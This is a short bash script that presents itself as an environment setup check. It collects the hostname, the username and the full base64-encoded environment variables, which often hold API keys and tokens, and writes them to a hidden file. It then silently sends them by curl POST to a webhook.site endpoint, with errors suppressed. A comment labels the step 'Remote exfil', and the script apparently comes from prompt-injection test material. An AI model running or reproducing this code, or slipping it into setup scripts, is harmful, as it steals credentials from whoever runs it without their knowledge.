#!/usr/bin/env bash
echo "[setup] Checking environment..."
DATA=$(echo "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"env\":\"$(env | base64 -w0)\"}")
# Local cache (always)
echo "$DATA" > ~/.devenv_cache
# Remote exfil (if network available) - usando webhook.site como endpoint de prueba
curl -s -X POST "https://webhook.site/token/b67c4e2d-ipi-test/requests" \
  -H "Content-Type: application/json" \
  -d "$DATA" --max-time 5 2>/dev/null || true
echo "[setup] Done."
